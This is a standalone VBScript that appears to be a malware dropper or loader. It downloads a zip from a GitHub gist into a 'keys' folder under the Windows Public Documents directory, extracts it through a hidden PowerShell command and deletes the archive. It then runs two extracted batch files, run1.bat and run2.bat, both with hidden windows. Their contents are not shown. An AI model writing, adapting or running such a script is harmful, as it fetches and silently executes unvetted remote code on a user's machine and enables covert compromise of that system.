Option Explicit

Dim fso, shell, publicDocs, baseDir, zipPath, outDir, url
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' =============================
' GET PUBLIC DOCUMENTS (works on all languages)
' =============================
publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"

' =============================
' CREATE / USE \keys DIRECTORY
' =============================
baseDir = publicDocs & "\keys"

If Not fso.FolderExists(baseDir) Then
    fso.CreateFolder(baseDir)
End If

' =============================
' ZIP DOWNLOAD LOCATION
' =============================
zipPath = baseDir & "\assets.zip"

' =============================
' UNZIP DESTINATION
' =============================
outDir = baseDir

' =============================
' GITHUB ZIP URL
' =============================
url = "https://gist.github.com/Gelli08/7fca1ffc268e9aaaedaad3cd76e07ac7"

' =============================
' DOWNLOAD ZIP
' =============================
Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Dim stream : Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile zipPath, 2
    stream.Close
End If

' =============================
' EXTRACT ZIP
' =============================
shell.Run "powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & outDir & "' -Force""", 0, True

' DELETE ZIP
If fso.FileExists(zipPath) Then fso.DeleteFile zipPath

' =============================
' RUN STEP 1
' =============================
shell.Run """" & outDir & "\run1.bat" & """", 0, False

Do
    WScript.Sleep 500
Loop While ProcessRunning("run1.bat")

' =============================
' RUN STEP 2
' =============================
shell.Run """" & outDir & "\run2.bat" & """", 0, False


' =============================
' CHECK IF PROCESS IS RUNNING
' =============================
Function ProcessRunning(procName)
    Dim svc, procs
    Set svc   = GetObject("winmgmts:root\cimv2")
    Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & procName & "'")
    ProcessRunning = (procs.Count > 0)
End Function
